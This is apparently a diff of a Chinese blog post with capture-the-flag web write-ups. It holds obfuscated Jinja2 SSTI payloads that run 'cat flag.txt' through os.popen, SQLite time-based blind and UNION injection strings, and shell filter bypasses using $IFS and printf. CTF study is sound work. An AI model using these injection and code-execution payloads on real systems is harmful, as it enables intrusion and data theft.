+<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">|</span>attr<span class="token punctuation">(</span><span class="token string">"\137\137\147etitem\137\137"</span><span class="token punctuation">)</span>
+<span class="token punctuation">(</span><span class="token number">117</span><span class="token punctuation">)</span><span class="token operator">|</span>attr<span class="token punctuation">(</span><span class="token string">"\137\137init\137\137"</span><span class="token punctuation">)</span><span class="token operator">|</span>attr<span class="token punctuation">(</span><span class="token string">"\137\137\147lobals\137\137"</span><span class="token punctuation">)</span><span class="token operator">|</span>attr<span class="token punctuation">(</span>"\<span class="token number">137</span>
+\<span class="token number">137</span>\147etitem\<span class="token number">137</span>\<span class="token number">137</span>"<span class="token punctuation">)</span>
+<span class="token punctuation">(</span><span class="token string">"\137\137b\165iltins\137\137"</span><span class="token punctuation">)</span><span class="token operator">|</span>attr<span class="token punctuation">(</span><span class="token string">"\137\137\147etitem\137\137"</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token string">"eval"</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token string">"\x5f\x5f\x69\x6d\x70\x6f\x72\x74\x5f\x5f\x28\x27\x6f\x73\x27\x29\x2e\x70\x6f\x70\x65\x6e\x28\x27\x63\x61\x74\x20\x66\x6c\x61\x67\x2e\x74\x78\x74\x27\x29\x2e\x72\x65\x61\x64\x28\x29"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">%</span><span class="token punctuation">&#125;</span></code></pre>
+
+<p>​        最后得到flag：</p>
+<blockquote>
+<p><img src="https://i.loli.net/2020/12/22/jOLQEXWDitd4gqo.png" alt="image-20201221201435648.png" loading="lazy"></p>
+</blockquote>
+<p>​        得到flag：<code>flag&#123;ef3e534a5bb4f67efb21fbfc3e8726b1&#125;</code>    </p>
+<pre class="language-none"><code class="language-none">flag&#123;ef3e534a5bb4f67efb21fbfc3e8726b1&#125;</code></pre>
+
+<p>​        后话：</p>
+<p>​                emmm，这个题目可以用 <strong>headers</strong> 来传噢，不过也无伤大雅吧，给个其他师傅的payload：</p>
+<pre class="language-python" data-language="python"><code class="language-python"><span class="token operator">/</span>success?msg<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token operator">%</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span>env<span class="token operator">|</span>attr<span class="token punctuation">(</span><span class="token string">"\x5f\x5finit\x5f\x5f"</span><span class="token punctuation">)</span><span class="token operator">|</span>attr<span class="token punctuation">(</span><span class="token string">"\x5f\x5f\x67lobals\x5f\x5f"</span><span class="token punctuation">)</span><span class="token operator">|</span>attr<span class="token punctuation">(</span><span class="token string">"\x67et"</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token string">"\x5f\x5fb\x75iltins\x5f\x5f"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">|</span>attr<span class="token punctuation">(</span><span class="token string">"\x67et"</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token string">"open"</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token string">"fla\x67\x2etxt"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">|</span>attr<span class="token punctuation">(</span><span class="token string">"read"</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">%</span><span class="token punctuation">&#125;</span></code></pre>
+
+<p>​                主要还是单引号和双引号没被过滤，这样就很简单的了。</p>
+<hr>
+<h4 id="PYER"><a href="#PYER" class="headerlink" title="PYER"></a>PYER</h4><p>​        这个题目不得不说，未免也<strong>太脑洞了 趴</strong> ！搞了很久很久！！！</p>
+<p>​        首先打开是一个登录框，然后没有任何提示，点注册也啥都没用（该功能未开放）：</p>
+<blockquote>
+<p><img src="https://i.loli.net/2020/12/22/TecMyim12kUFtLP.png" alt="image-20201221203014112.png" loading="lazy"></p>
+</blockquote>
+<p>​        然后手工试了一下，发现用户名在输入形如  <code>admin&#39;</code> 时会出现500：</p>
+<blockquote>
+<p><img src="https://i.loli.net/2020/12/22/bnykNQEpY64rOvU.png" alt="image-20201221203134025.png" loading="lazy"></p>
+</blockquote>
+<p>​        如果输入 <code>admin&#39;or(1);#</code> 也是500：</p>
+<blockquote>
+<p><img src="https://i.loli.net/2020/12/22/DTWkeS4FihOElq1.png" alt="image-20201221203311140.png" loading="lazy"></p>
+</blockquote>
+<p>​        但  <code>admin&#39;or(1);-- -</code> 则会正常返回一个 <code>login error</code>：</p>
+<blockquote>
+<p><img src="https://i.loli.net/2020/12/22/qZOmiRaoVdCwJEA.png" alt="image-20201221203340811.png" loading="lazy"></p>
+</blockquote>
+<p>​        通过注释符号，盲猜很有可能是 <strong>sqlite数据库</strong> ，并且在用户名这里应该是存在注入点的。</p>
+<p>​        尝试简单的使用笛卡尔积进行延迟盲注：</p>
+<pre class="language-python" data-language="python"><code class="language-python">username<span class="token operator">=</span>admin<span class="token string">'and length((select count(*) from sqlite_master,sqlite_master,sqlite_master,sqlite_master,sqlite_master,sqlite_master,sqlite_master,sqlite_master,sqlite_master,sqlite_master,sqlite_master)) and'</span><span class="token number">1</span><span class="token punctuation">;</span><span class="token operator">-</span><span class="token operator">-</span> <span class="token operator">-</span><span class="token operator">&amp;</span>password<span class="token operator">=</span><span class="token number">123</span><span class="token operator">&amp;</span>submit<span class="token operator">=</span><span class="token operator">%</span>E7<span class="token operator">%</span><span class="token number">99</span><span class="token operator">%</span>BB<span class="token operator">%</span>E9<span class="token operator">%</span><span class="token number">99</span><span class="token operator">%</span><span class="token number">86</span></code></pre>
+
+<p>​        发现应该就是sqlite数据库，然后可以使用时间盲注：</p>
+<blockquote>
+<p><img src="https://i.loli.net/2020/12/22/v85Mjs2nygqVTDa.png" alt="image-20201221204614653.png" loading="lazy"></p>
+</blockquote>
+<p>​        不过使用笛卡尔积是不够效率的，可以使用其他方式，比如以下的函数：</p>
+<ul>
+<li>**randomblob(N)**：返回一个 N 字节长的包含伪随机字节的 BLOG，由于是生成大字节的为随机字符，所以是会有不少延迟的，可以作为盲注判断</li>
+</ul>
+<p>​        然后懒得写脚本了，就直接用burp跑一跑就完事了，可以直接用回显时间差来判断是否盲注，比如说以下得到的结果为 <strong>”c“</strong>：</p>
+<blockquote>
+<p><img src="https://i.loli.net/2020/12/22/JMYAHing53hLUfb.png" alt="image-20201221210836493.png" loading="lazy"></p>
+</blockquote>
+<p>​        在注入第2个表名时，得到 <code>users</code> 表，然后盲猜密码字段名为 <code>password</code> ，然后爆破第一个记录的用户密码，这里爆出密码的第1位为 <code>s</code>：</p>
+<blockquote>
+<p><img src="https://i.loli.net/2020/12/22/BGl5ug1cpMIwPU9.png" alt="image-20201221211118141.png" loading="lazy"></p>
+</blockquote>
+<p>​        之后就一个个爆，发现似乎是有规律的，得到最终密码：</p>
+<pre class="language-none"><code class="language-none">sqlite_not_safe</code></pre>
+
+<p>​        然后使用 <code>admin</code> 成功进入后台：</p>
+<blockquote>
+<p><img src="https://i.loli.net/2020/12/22/o7L52PWfHeO8sgb.png" alt="image-20201221211233355.png" loading="lazy"></p>
+</blockquote>
+<p>​        结合题目 <strong>pyer</strong> 以及回显可知，这个是python3的web应用，也许存在 <strong>SSTI</strong> ，对没错就可能是 <strong>SSTI</strong> ，还以为说是只是个盲注题，结果flag不在数据里边！！！</p>
+<blockquote>
+<p><img src="https://i.loli.net/2020/12/22/jk1izZgnBMcHDpy.png" alt="image-20201221211405626.png" loading="lazy"></p>
+</blockquote>
+<p>​        然后输入 <code>guest&#39;or(1);-- -</code> 时，得到：</p>
+<blockquote>
+<p><img src="https://i.loli.net/2020/12/22/guwEiPUKmXZIDr5.png" alt="image-20201221211724225.png" loading="lazy"></p>
+</blockquote>
+<p>​        而当输入 <code>guest&#39;and(0);-- -</code>时，则显示：</p>
+<blockquote>
+<p><img src="https://i.loli.net/2020/12/22/P8WbfKlND2cEHxh.png" alt="image-20201221212649141.png" loading="lazy"></p>
+</blockquote>
+<p>​        输入 <code>guest&#39;order by ?;-- -</code>猜解字段数量，得到字段数为 <code>1</code> 0.0：</p>
+<blockquote>
+<p><img src="https://i.loli.net/2020/12/22/NbjPTiKcEhHXz13.png" alt="image-20201221212303127.png" loading="lazy"></p>
+</blockquote>
+<p>​        然后就，可以用联合注入来做回显注入用了，这里发现只有两个表（分别是 <code>comment</code> 和 <code>users</code> )，没有第三个表了：</p>
+<blockquote>
+<p><img src="https://i.loli.net/2020/12/22/zjqsXrknRUyIpNt.png" alt="image-20201221213043811.png" loading="lazy"></p>
+</blockquote>
+<blockquote>
+<p><img src="https://i.loli.net/2020/12/22/nWEcDhRjHXkTbG2.png" alt="image-20201221213025224.png" loading="lazy"></p>
+</blockquote>
+<p>​        这里卡了很久，后来想到这会不会是一个披着 <strong>sqlite</strong> 的 <strong>SSTI</strong> ，就索性尝试了一下，发现确实如此：</p>
+<blockquote>
+<p><img src="https://i.loli.net/2020/12/22/qjeAS1Exa8QNbL2.png" alt="image-20201221213224928.png" loading="lazy"></p>
+</blockquote>
+<p>​        行吧，直接随便打一个python3的 <strong>SSTI</strong> 的 <strong>rce</strong> 的payload就行了：</p>
+<blockquote>
+<p><img src="https://i.loli.net/2020/12/22/9RWtG41Tq8warYN.png" alt="image-20201221213539700.png" loading="lazy"></p>
+</blockquote>
+<p>​        最后直接读就行啦：</p>
+<blockquote>
+<p><img src="https://i.loli.net/2020/12/22/uD9YWymlV2RPfd6.png" alt="image-20201221213627703.png" loading="lazy"></p>
+</blockquote>
+<p>​        得到flag：<code>flag&#123;7e33ef352f511fc071497ec186474a7f&#125;</code></p>
+<pre class="language-none"><code class="language-none">flag&#123;7e33ef352f511fc071497ec186474a7f&#125;</code></pre>
+
+<p>​        后记：</p>
+<p>​                好像没啥好说的，盲注脚本就懒得写了，基本也就那个原理吧。用时间差再加上<strong>两层循环</strong>就OK了，其实也没啥的，<strong>too easy</strong> 然后是这个 <strong>SSTI</strong> 怎么说呢实在是有些脑洞了。。</p>
+<hr>
+<h4 id="HIDS"><a href="#HIDS" class="headerlink" title="HIDS"></a>HIDS</h4><p>​        首先看出来这是一个命令执行：</p>
+<p><img src="https://i.loli.net/2020/12/22/A38hw24aBpcjoqd.png" alt="image-20201221213959553.png" loading="lazy"></p>
+<p>​        并且还过滤了不少东西，比如 <strong>{</strong> 和 **}**，空格 [ ]，逗号 <strong>,</strong> 点 <strong>.</strong> 等等。。。</p>
+<p>​        先看请求情况，显然是向 <code>/run</code> 发送 <code>cmd</code> 的POST请求：</p>
+<blockquote>
+<p><img src="https://i.loli.net/2020/12/22/Ui6wzn8NPMvKy2D.png" alt="image-20201221214129825.png" loading="lazy"></p>
+</blockquote>
+<p>​        只是过滤了不少东西，并且显然这个是 <code>/bin/sh</code> ：</p>
+<blockquote>
+<p><img src="https://i.loli.net/2020/12/22/TqZmY1SvPGzD2hK.png" alt="image-20201221214538543.png" loading="lazy"></p>
+</blockquote>
+<p>​        emmm，是可以使用 <code>$IFS$9</code> 来绕过空格的，不过可以用别的方式在不适用 <code>$&#123;IFS&#125;</code> 的情况下绕过空格，比如：</p>
+<pre class="language-none"><code class="language-none">echo$IFS\ahhhh</code></pre>
+
+<blockquote>
+<p><img src="https://i.loli.net/2020/12/22/nTJWtw2PecpAVNb.png" alt="image-20201221214649459.png" loading="lazy"></p>
+</blockquote>
+<p>​        但问题是无法正常的执行任意命令，而在 <strong>linux</strong> 中比如 <code>printf</code> 是可以将 <strong>16进制</strong> 或 <strong>8进制</strong> 字符给正常输出出来的，那么可以使用现有的可用的没被ban的命令去构造一个 <code>printf</code> 。</p>
+<p>​        同时 “<strong>$</strong>“ 、 “<strong>(</strong>“ 和 “<strong>)</strong>“ 都没被过滤，由于在 <strong>linux</strong> 中，有如下的特性（摘自<a target="_blank" rel="noopener" href="https://linux.cn/article-5657-1.html%EF%BC%89%EF%BC%9A">https://linux.cn/article-5657-1.html）：</a></p>
+<p>Shell符号及各种解释对照表：</p>
+<table>
+<thead>
+<tr>
+<th align="center"><code>Shell符号</code></th>
+<th>使用方法及说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="center"><code>#</code></td>
+<td>注释符号(Hashmark[Comments])1.在shell文件的行首，作为shebang标记，#!/bin/bash;2. 其他地方作为注释使用，在一行中，#后面的内容并不会被执行，除非；3. 但是用单/双引号包围时，#作为#号字符本身，不具有注释作用。</td>
+</tr>
+<tr>
+<td align="center"><code>;</code></td>
+<td>作为多语句的分隔符(Command separator [semicolon])。多个语句要放在同一行的时候，可以使用分号分隔。注意，有时候分号需要转义。</td>
+</tr>
+<tr>
+<td align="center"><code>;;</code></td>
+<td>连续分号(Terminator [double semicolon])。在使用case选项的时候，作为每个选项的终结符。在Bash version 4+ 的时候，还可以使用[;;&amp;], [;&amp;]</td>
+</tr>
+<tr>
+<td align="center"><code>.</code></td>
+<td>点号(dot command [period])。1. 相当于bash内建命令source，如：<code>#!/bin/bash. data-file#包含data-file;</code>2. 作为文件名的一部分，在文件名的开头，表示该文件为隐藏文件，ls一般不显示出来（ls -a 可以显示）；3. 作为目录名，一个点代表当前目录，两个点号代表上层目录（当前目录的父目录）。注意，两个以上的点不出现，除非你用引号（单/双）包围作为点号字符本身；4. 正则表达式中，点号表示任意一个字符。</td>
+</tr>
+<tr>
+<td align="center"><code>&quot;</code></td>
+<td>双引号（partial quoting [double quote]）。部分引用。双引号包围的内容可以允许变量扩展，也允许转义字符的存在。如果字符串内出现双引号本身，需要转义，因此不一定双引号是成对的。</td>
+</tr>
+<tr>
+<td align="center"><code>&#39;</code></td>
+<td>单引号(full quoting [single quote])。单引号括住的内容，被视为单一字符串，引号内的禁止变量扩展，所有字符均作为字符本身处理（除单引号本身之外），单引号必须成对出现。</td>
+</tr>
+<tr>
+<td align="center"><code>,</code></td>
+<td>逗号(comma operator [comma])。1. 用在连接一连串的数学表达式中，这串数学表达式均被求值，但只有最后一个求值结果被返回。如：<code>#!/bin/bashlet t1=((a=5+1, b=7+2))echo t1=$t1, a=$a, b=$b## 这个$t1=$b；</code>2. 用于参数替代中，表示首字母小写，如果是两个逗号，则表示全部小写，注意，这个特性在bash version 4的时候被添加的。例子：<code>a=&quot;ATest&quot;echo $&#123;a,&#125;echo $&#123;a,,&#125;## 前面输出aTest，后面输出的是atest。</code></td>
+</tr>
+<tr>
+<td align="center"><code>\</code></td>
+<td>反斜线，反斜杆(escape [backslash])。1. 放在特殊符号之前，转义特殊符号的作用，仅表示特殊符号本身，这在字符串中常用；2. 放在一行指令的最末端，表示紧接着的回车无效（其实也就是转义了Enter），后继新行的输入仍然作为当前指令的一部分。</td>
+</tr>
+<tr>
+<td align="center"><code>/</code></td>
+<td>斜线，斜杆（Filename path separator [forward slash]）。1.作为路径的分隔符，路径中仅有一个斜杆表示根目录，以斜杆开头的路径表示从根目录开始的路径；2.在作为运算符的时候，表示除法符号。如：<code>a=4/2</code></td>
+</tr>
+<tr>
+<td align="center"><code>反``引号</code></td>
+<td>反引号，后引号（Command substitution[backquotes])。命令替换。这个引号包围的为命令，可以执行包围的命令，并将执行的结果赋值给变量。如：｀a= ｀ dirname ‘/tmp/x.log’ ｀｀ 。后面dirname返回的结果会赋值给a，注意，此处Mitchell特地使用了反引号和单引号，注意区别。</td>
+</tr>
+<tr>
+<td align="center"><code>$()</code></td>
+<td>$( )与｀｀ 在操作上，这两者都是达到相应的效果，但是建议使用<code>$( )</code>，因为在多层次的符合替换中，｀｀必须要额外的转义处理（反斜杠），而 <code>$( )</code> 更直观些。</td>
+</tr>
+<tr>
+<td align="center"><code>:</code></td>
+<td>冒号(null command [colon])。空命令，这个命令什么都不做，但是有返回值，返回值为0（即：true）。这个命令的作用非常奇妙。1. 可做while死循环的条件；2. 在if分支中作为占位符（即某一分支什么都不做的时候）；3. 放在必须要有两元操作的地方作为分隔符，如：<code>: $&#123;username=</code>whoami<code>&#125;</code>4. 在参数替换中为字符串变量赋值，在重定向操作(&gt;)中，把一个文件长度截断为0（:&gt;&gt;这样用的时候，目标存在则什么都不做），这个只能在普通文件中使用，不能在管道，符号链接和其他特殊文件中使用；5. 甚至你可以用来注释（#后的内容不会被检查，但:后的内容会被检查，如果有语句如果出现语法错误，则会报错）；6. 你也可以作为域分隔符，比如环境变量$PATH中，或者passwd中，都有冒号的作为域分隔符的存在；7. 你也可以将冒号作为函数名，不过这个会将冒号的本来意义转变（如果你不小心作为函数名，你可以使用<code>unset -f : </code>来取消function的定义）。</td>
+</tr>
+<tr>
+<td align="center"><code>!</code></td>
+<td>感叹号（reverse (or negate) [bang],[exclamation mark])。取反一个测试结果或退出状态。1. 表示反逻辑，比如后面的!=,这个是表示不等于；2. 表示取反，如：ls a[!0-9] #表示a后面不是紧接一个数字的文件；3. 在不同的环境里面，感叹号也可以出现在间接变量引用里面；4. 在命令行中，可以用于历史命令机制的调用，你可以试试!$,!#，或者!-3看看，不过要注意，这点特性不能在脚本文件里面使用（被禁用）。</td>
+</tr>
+<tr>
+<td align="center"><code>*</code></td>
+<td>星号（wildcard/arithmetic operator[asterisk])。1. 作为匹配文件名扩展的一个通配符，能自动匹配给定目录下的每一个文件；2. 正则表达式中可以作为字符限定符，表示其前面的匹配规则匹配任意次；3. 算术运算中表示乘法。</td>
+</tr>
+<tr>
+<td align="center"><code>**</code></td>
+<td>双星号(double asterisk)。算术运算中表示求幂运算。</td>
+</tr>
+<tr>
+<td align="center"><code>?</code></td>
+<td>问号（test operator/wildcard[Question mark])。1. 表示条件测试；2. 在双括号内表示C风格的三元操作符((condition?true-result:false-result))；3. 参数替换表达式中用来测试一个变量是否设置了值；4. 作为通配符，用于匹配文件名扩展特性中，用于匹配单个字符；5. 正则表达式中，表示匹配其前面规则0次或者1次。</td>
+</tr>
+<tr>
+<td align="center"><code>$</code></td>
+<td>美元符号(Variable substitution[Dollar sign])。1. 作为变量的前导符，用作变量替换，即引用一个变量的内容，比如：<code>echo $PATH</code>；2. 在正则表达式中被定义为行末（End of line）。</td>
+</tr>
+<tr>
+<td align="center"><code>$&#123;&#125;</code></td>
+<td>参数替换(Variable substitution)。用于在字符串中表示变量。</td>
+</tr>
+<tr>
+<td align="center"><code>$‘...’</code></td>
+<td>引用内容展开，执行单引号内的转义内容（单引号原本是原样引用的），这种方式会将引号内的一个或者多个[]转义后的八进制，十六进制值展开到ASCII或Unicode字符。</td>
+</tr>
+<tr>
+<td align="center"><code>$*</code> <code>$@</code></td>
+<td>位置参数(Positional Parameters)。这个在使用脚本文件的时候，在传递参数的时候会用到。两者都能返回调用脚本文件的所有参数，但$<em>是将所有参数作为一个整体返回（字符串），而$@是将每个参数作为单元返回一个参数列表。注意，在使用的时候需要用双引号将$</em>,$@括住。这两个变量受到$IFS的影响，如果在实际应用中，要考虑其中的一些细节。</td>
+</tr>
+<tr>
+<td align="center"><code>$#</code></td>
+<td>表示传递给脚本的参数数量。</td>
+</tr>
+<tr>
+<td align="center"><code>$?</code></td>
+<td>此变量值在使用的时候，返回的是最后一个命令、函数、或脚本的退出状态码值，如果没有错误则是0，如果为非0，则表示在此之前的最后一次执行有错误。</td>
+</tr>
+<tr>
+<td align="center"><code>$$</code></td>
+<td>进程ID变量，这个变量保存了运行当前脚本的进程ID值。</td>
+</tr>
+<tr>
+<td align="center"><code>()</code></td>
+<td>圆括号(parentheses)。1， 命令组（Command group）。由一组圆括号括起来的命令是命令组，命令组中的命令实在子shell（subshell）中执行。因为是在子shell内运行，因此在括号外面是没有办法获取括号内变量的值，但反过来，命令组内是可以获取到外面的值，这点有点像局部变量和全局变量的关系，在实作中，如果碰到要cd到子目录操作，并在操作完成后要返回到当前目录的时候，可以考虑使用subshell来处理；2. 用于数组的初始化。</td>
+</tr>
+<tr>
+<td align="center"><code>&#123;x,y,z,...&#125;</code></td>
+<td>花括号扩展(Brace Expansion)。在命令中可以用这种扩展来扩展参数列表，命令将会依照列表中的括号分隔开的模式进行匹配扩展。注意的一点是，这花括号扩展中不能有空格存在，如果确实有必要空格，则必须被转义或者使用引号来引用。例子：<code>echo &#123;a,b,c&#125;-&#123;\ d,&quot; e&quot;,&#39; f&#39;&#125;</code></td>
+</tr>
+<tr>
+<td align="center"><code>&#123;a..z&#125;</code></td>
+<td>在Bash version 3时添加了这种花括号扩展的扩展，可以使用{A..Z}表示A-Z的所有字符列表，这种方式的扩展Mitchell测试了一下，好像仅适用于A-Z，a-z，还有数字{最小..最大}的这种方式扩展。</td>
+</tr>
+<tr>
+<td align="center"><code>&#123;&#125;</code></td>
+<td>代码块(curly brackets)。这个是匿名函数，但是又与函数不同，在代码块里面的变量在代码块后面仍能访问。注意：花括号内侧需要有空格与语句分隔。另外，在<code>xargs -i</code>中的话，还可以作为文本的占位符，用以标记输出文本的位置。</td>
+</tr>
+<tr>
+<td align="center"><code>&#123;&#125; \;</code></td>
+<td>这个{}是表示路径名，这个并不是shell内建的，现在接触到的情况看，好像只用在find命令里。注意后面的分号，这个是结束<code>find</code>命令中<code>-exec</code>选项的命令序列，在实际使用的时候，要转义一下以免被shell理解错误。</td>
+</tr>
+<tr>
+<td align="center"><code>[]</code></td>
+<td>中括号（brackets）。1. 测试的表示，Shell会测试在[]内的表达式，需要注意的是，[]是Shell内建的测试的一部分，而非使用外部命令<code>/usr/bin/test</code>的链接；2. 在数组的上下文中，表示数组元素，方括号内填上数组元素的位置就能获得对应位置的内容，如：<code>Array[1]=xxxecho $&#123;Array[1]&#125;;</code>3. 表示字符集的范围，在正表达式中，方括号表示该位置可以匹配的字符集范围。</td>
+</tr>
+<tr>
+<td align="center"><code>[[]]</code></td>
+<td>双中括号(double brackets)。这个结构也是测试，测试[[]]之中的表达式(Shell的关键字)。这个比单中括号更能防止脚本里面的逻辑错误，比如：&amp;&amp;,||,&lt;,&gt;操作符能在一个[[]]里面测试通过，但是在[]却不能通过。[[]]里面没有文件名扩展(filename expansion）或是词分隔符(Word splitting)，但是可以用参数扩展(Parameter expansion)和命令替换(command substitution)。不用文件名通配符和像空白这样的分隔符。注意，这里面如果出现了八进制，十六进制等，shell会自动执行转换比较。</td>
+</tr>
+<tr>
+<td align="center"><code>$[...]</code></td>
+<td>词表达表示整数扩展(integer expansion)。在方括号里面执行整数表达式。例：<code>a=3b=7echo $[$a+$b]echo $[$a*$b]##返回是10和21</code></td>
+</tr>
+<tr>
+<td align="center"><code>(())</code></td>
+<td>双括号(double parentheses)。表示整数扩展（integer expansion）。功能和上面的$[]差不多，但是需要注意的是，$[]是会返回里面表达式的值的，而(())只是执行，并不会返回值。两者执行后如果变量值发生变化，都会影响到后继代码的运行。可对变量赋值，可以对变量进行一目操作符操作，也可以是二目，三目操作符。</td>
+</tr>
+<tr>
+<td align="center"><code>&gt;</code> <code>&amp;&lt;</code> <code>&gt;&amp;</code> <code>&gt;&gt;</code> <code>&lt;</code> <code>&lt;&gt;</code></td>
+<td>重定向(redirection)。<code>scriptname &gt;filename</code> 重定向scriptname的输出到文件filename中去，如果文件存在则覆盖；<code>command &amp;&gt;filename</code> 重定向command的标准输出(stdout)和标准错误(stderr)到文件filename中；<code>command &gt;&amp;2</code> 把command的标准输出(stdout)重定向到标准错误(stderr)中；<code>scriptname &gt;&gt;filename</code> 把scriptname的输出（同&gt;)追加到文件filenmae中，如果文件不存在则创建。<code>[i]&lt;&gt;filename</code> 打开filename这个文件用来读或者写，并且给文件指定i为它的文件描述符(file descriptor)，文件不存在就会创建。</td>
+</tr>
+<tr>
+<td align="center"><code>(command)&gt;</code> <code>&lt;(command)</code></td>
+<td>这是进程替换(Process Substitution)。使用的时候注意，括号和&lt;,&gt;之间是不能有空格的，否则报错。其作用有点类似通道，但和管道在用法上又有些不同，管道是作为子进程的方式来运行的，这个命令会在<code>/dev/fd/</code>下面产生类似<code>/dev/fd/63</code>,<code>/dev/fd/62</code>这类临时文件，用来传递数据。Mitchell个人猜测之所以用这种方法来传递，是因为前后两个不属于同一个进程，因此需要用共享文件的方式来传递资料(这么说其实管道也应该有同样的文件?)。网上有人说这个只是共享文件而已，但是经过测试，发现虽然有<code>/dev/fd/63</code>这样的文件产生，但是这个文件其实是指向pipe:[43434]这样的通道的链接。</td>
+</tr>
+<tr>
+<td align="center"><code>&lt;&lt;</code></td>
+<td>双小于号(here-document[double less then marks])。这个也被称为Here-document，用来将后继的内容重定向到左侧命令的stdin中。&lt;&lt;可以节省格式化时间，别且使命令执行的处理更容易。在实作的时候只需要输入&lt;&lt;和终止标志符，而后（一般是回车后）你就可以输入任何内容，只要在最后的新行中输入终止标志符，即可完成数据的导入。使用here-document的时候，你可以保留空格，换行等。如果要让shell脚本更整洁一点，可以在&lt;&lt;和终止符之间放上一个连字符(-)。</td>
+</tr>
+<tr>
+<td align="center"><code>&lt;&lt;&lt;</code></td>
+<td>三个小于号(here-strings)。Here-字串和Here-document类似，here-strings语法：<code>command [args] &lt;&lt;&lt;[&quot;]$word[&quot;]</code>；$word会展开并作为command的stdin。</td>
+</tr>
+<tr>
+<td align="center"><code>&lt;</code> <code>&gt;</code></td>
+<td>小于，大于号(ASCII Comparison)。ASCII比较，进行的是变量的ASCII比较，字串？数字?呃…这个…不就是ASCII比较么？</td>
+</tr>
+<tr>
+<td align="center"><code>\&lt;...\&gt;</code></td>
+<td>词界符(word boundary)。这个是用在正则表达式中的一个特殊分隔符，用来标记单词的分界。比如：the会匹配there，another，them等等，如果仅仅要匹配the，就可以使用这个词界符，&lt;the&gt;就只能匹配the了。</td>
+</tr>
+<tr>
+<td align="center">`</td>
+<td>`</td>
+</tr>
+<tr>
+<td align="center">`&gt;</td>
+<td>`</td>
+</tr>
+<tr>
+<td align="center"><code>&amp;</code></td>
+<td>与号(Run job in background[ampersand])。如果命令后面跟上一个&amp;符号，这个命令将会在后台运行。有的时候，脚本中在一条在后台运行的命令可能会引起脚本挂起，等待输入，出现这种情况可以在原有的脚本后面使用wait命令来修复。</td>
+</tr>
+<tr>
+<td align="center"><code>&amp;&amp;</code> `</td>
+<td></td>
+</tr>
+<tr>
+<td align="center"><code>-</code></td>
+<td>减号，连字符(Hyphen/minus/dash)。1. 作为选项，前缀[option, prefix]使用。用于命令或者过滤器的选项标志；操作符的前缀。如：<code>## COMMAND -[选项列表]ls -alsort -dfu $fileset -- $variable if [ $file -ot $file2 ]then    echo &quot;$file is older than $file2.&quot;fi</code>2. 用于stdin或者stdout的重定向的源或目的[dash].在tar没有bunzip2的程序补丁时，我们可以这样： `bunzip2 linux-2.6.13.tar.bz2</td>
+</tr>
+<tr>
+<td align="center"><code>=</code></td>
+<td>等号(Equals)。1. 赋值操作，给变量赋值，么有空格在等号两侧；2. 在比较测试中作为比较符出现，这里要注意，如果在中括号中作为比较出现，需要有空格符在等号左右两侧。</td>
+</tr>
+<tr>
+<td align="center"><code>+</code></td>
+<td>加号(Plus)。1. 算术操作符，表示加法；2. 在正则表达式中，表示的是其前的这个匹配规则匹配最少一次;3.在命令或过滤器中作为选项标记，在某些命令或者内置命令中使用+来启用某些选项，使用-来禁止；4. 在参数替换(parameter substitution)中，+前缀表示替代值(当变量为空的时候，使用+后面的值)</td>
+</tr>
+<tr>
+<td align="center"><code>%</code></td>
+<td>百分号(modulo[percent sign])。1.在算术运算中，这个是求模操作符，即两个数进行除法运算后的余数；2. 在参数替换(parameter substitution)中，可以作为模式匹配。例子：<code>p=b*9var=&quot;abcd12345abc479&quot;echo $&#123;var%p&#125;, $&#123;var%%p&#125;##从右边开始查找(想想从左是那个符号?)##任何在b和9之间的内容（含）##第一个是找到最短的符合匹配项##后一个是找最大符合的匹配项（贪婪匹配?)</code></td>
+</tr>
+<tr>
+<td align="center"><code>~</code></td>
+<td>波浪号(Home directory[tilde])。这个和内部变量$HOME是一样的。默认表示当前用户的家目录（主目录），这个和~/效果一致，如果波浪号后面跟用户名，表示是该用户的家目录。</td>
+</tr>
+<tr>
+<td align="center"><code>~+</code></td>
+<td>当前的工作目录(current working directory)。这个和内置变量$PWD一样。</td>
+</tr>
+<tr>
+<td align="center"><code>~-</code></td>
+<td>前一个工作目录(previous working directory)。这个和内部变量$OLDPWD一致，之前的[-]也一样。</td>
+</tr>
+<tr>
+<td align="center"><code>=~</code></td>
+<td>Bash 版本3中有介绍，这个是正则表达式匹配。可用在[[]]测试中，比如：`var=”this is a test message.”[[ “$var” =~ tf*message ]] &amp;&amp; echo “Sir. Found that.”</td>
+</tr>
+<tr>
+<td align="center"><code>^</code></td>
+<td>脱字符(caret)。1. 在正则表达式中，作为一行的行首(beginning-of-line)位置标志符；2. 在参数替换(Parameter substitution)中，这个用法有两种，一个脱字符(<code>$&#123;var^&#125;</code>)，或两个(<code>$&#123;var^^&#125;</code>)，分别表示第一个字母大写，全部大写的意思(Bash version &gt;=4)。</td>
+</tr>
+<tr>
+<td align="center"><code>空白</code></td>
+<td>空白符(Whitespace)。空白符不仅仅是指空格(spaces)，还包括制表符(tabs)，空行(blank lines)，或者这几种的组合。可用做函数的分隔符,分隔命令或变量，空行不会影响脚本的行为，因此可以用它来规划脚本代码，以增加可读性，在内置的特殊变量$IFS可以用来针对某些命令进行输入的参数进行分割，其默认就是空白符。在字符串或变量中如果有空白符，可以使用引号来规避可能的错误。</td>
+</tr>
+</tbody></table>
+<p>​        比如可以构造出一个：</p>
+<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token variable"><span class="token variable">$(</span><span class="token builtin class-name">printf</span><span class="token environment constant">$IFS</span><span class="token string">"<span class="token entity" title="\x69">\x69</span><span class="token entity" title="\x64">\x64</span>"</span><span class="token variable">)</span></span></code></pre>
+
+<p>​        但是上边的只能在 bash 用，在sh会出现如下问题：</p>
+<blockquote>
+<p><img src="https://i.loli.net/2020/12/22/f6PlkSZD3CLzEin.png" alt="image-20201221221144727.png" loading="lazy"></p>
